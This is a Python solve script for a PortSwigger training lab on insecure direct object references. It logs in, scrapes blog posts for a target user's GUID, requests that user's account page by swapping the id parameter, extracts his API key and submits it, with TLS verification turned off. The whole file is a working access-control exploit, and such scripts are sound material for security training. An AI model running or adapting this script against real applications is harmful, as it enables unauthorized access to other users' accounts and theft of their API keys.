#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
User ID controlled by request parameter with unpredictable user IDs.

Finds carlos's GUID from a blog post author link, fetches his account page,
extracts the API key, and submits it.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username or password" in r.text:
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def find_user_guid(session: requests.Session, lab: str, target: str) -> str:
    # Check the blog listing page
    r = session.get(f"{lab}/")
    # Look for author links containing userId= or id= with a UUID
    pattern = rf'userId=([0-9a-f-]{{36}})[^"]*"[^>]*>{target}<'
    m = re.search(pattern, r.text, re.IGNORECASE)
    if not m:
        # Try fetching individual blog posts
        post_ids = re.findall(r'postId=(\d+)', r.text)
        for pid in post_ids:
            rp = session.get(f"{lab}/post?postId={pid}")
            m = re.search(pattern, rp.text, re.IGNORECASE)
            if m:
                break
    if not m:
        raise SystemExit(f"[-] Could not find GUID for user '{target}'")
    return m.group(1)


def get_api_key(session: requests.Session, lab: str, guid: str) -> str:
    r = session.get(f"{lab}/my-account", params={"id": guid})
    m = re.search(r"Your API Key is:\s*<[^>]+>([^<]+)<", r.text)
    if not m:
        m = re.search(r"API Key[^:]*:\s*([A-Za-z0-9]+)", r.text)
    if not m:
        raise SystemExit("[-] Could not extract API key")
    return m.group(1).strip()


def submit_solution(session: requests.Session, lab: str, answer: str) -> None:
    csrf = get_csrf(session, lab)
    r = session.post(f"{lab}/submitSolution", data={"answer": answer, "csrf": csrf})
    if r.ok:
        print("[+] Solution submitted. Lab solved.")
    else:
        print(f"[-] Submission status {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 6 (IDOR with unpredictable GUID)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--target", default="carlos")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    print(f"[*] Searching blog posts for {args.target}'s GUID...")
    guid = find_user_guid(s, lab, args.target)
    print(f"[*] Found GUID: {guid}")

    api_key = get_api_key(s, lab, guid)
    print(f"[+] API key: {api_key}")

    submit_solution(s, lab, api_key)


if __name__ == "__main__":
    main()
